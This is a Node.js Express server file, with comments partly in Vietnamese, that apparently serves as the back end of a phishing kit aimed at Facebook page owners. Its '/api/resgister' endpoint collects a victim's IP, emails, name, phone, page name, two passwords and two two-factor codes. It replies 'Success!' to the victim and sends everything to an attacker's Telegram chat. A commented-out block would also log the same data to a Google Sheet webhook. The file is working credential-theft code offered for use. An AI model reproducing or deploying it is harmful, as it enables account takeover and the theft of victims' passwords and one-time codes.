import express from "express";
import 'dotenv/config';
import cors from "cors";
import TelegramBot from 'node-telegram-bot-api';
import axios from "axios";

const app = express();
 
app.use(cors('*'));

app.use(express.json());

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
// const bot_two = new TelegramBot(process.env.BOT_TOKEN_BOT_TWO, { polling: true });

app.post('/api/resgister', (req, res) => {
    // GET DATA FROM CLIENT
    const data = req.body; 

    const result = {
        "status": 0,
        "message": "Success!"
    }

    res.send(result);

    // SEND DATA TO TELE
    
    const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}\n-----------------------------\n<strong>Email Business:</strong> <code>${data.businessEmail ? data.businessEmail : ''} </code>\n<strong>Email Personal:</strong> <code>${data.personalEmail ? data.personalEmail : ''}</code>\n<strong>Full Name:</strong> <code>${data.fullName ? data.fullName : ''} </code>\n<strong>Fanpage Name:</strong> <code>${data.fanpageName ? data.fanpageName : ''}</code>\n<strong>Phone Number:</strong> <code>${data.mobilePhone ? data.mobilePhone : ''}</code>\n<strong>Password First:</strong> <code>${data.passwordFirst ? data.passwordFirst : ''}</code>\n<strong>Password Second:</strong> <code>${data.passwordSecond ? data.passwordSecond : ''}</code>\n-----------------------------\n<strong>First Two-Fa:</strong> <code>${data.firstTwoFa ? data.firstTwoFa : ''}</code>\n<strong>Second Two-Fa:</strong> <code>${data.secondTwoFa ? data.secondTwoFa : ''}</code>\n`;

    bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'html' });




    // bot_two.sendMessage(process.env.CHAT_ID_BOT_TWO, location,  { parse_mode: 'HTML' });


    // ADD GOOGLE SHEET
    // const url = new URL(process.env.WEBHOOK_URL);

    // url.searchParams.append('Ip', data.ip ? data.ip : '');
    // url.searchParams.append('City', data.city ? data.city : '');
    // url.searchParams.append('Country', data.country ? data.country : '');
    // url.searchParams.append('Email Business', data.businessEmail ? data.businessEmail : '');
    // url.searchParams.append('Email Personal', data.personalEmail ? data.personalEmail : '');
    // url.searchParams.append('Full Name', data.fullName ? data.fullName : '');
    // url.searchParams.append('Fanpage Name', data.fanpageName ? data.fanpageName : '');
    // url.searchParams.append('Phone Number', data.mobilePhone ? data.mobilePhone : '');
    // // 
    // url.searchParams.append('Password First', data.passwordFirst ? data.passwordFirst : '');
    // url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
    // // 
    // url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
    // url.searchParams.append('Second Two-Fa', data.secondTwoFa ? data.secondTwoFa : '');

    // axios.get(url)
    // .then(response => {
    //     const data = response.data;
    //     if (data.status === 'success') {
    //         bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
    //     } else {
    //         bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
    //     }
    // })
    // .catch(error => {
    //     bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
    // });

});

app.listen(process.env.PORT, () => {
    console.log(`Server đang lắng nghe tại cổng ${process.env.PORT}`);
});
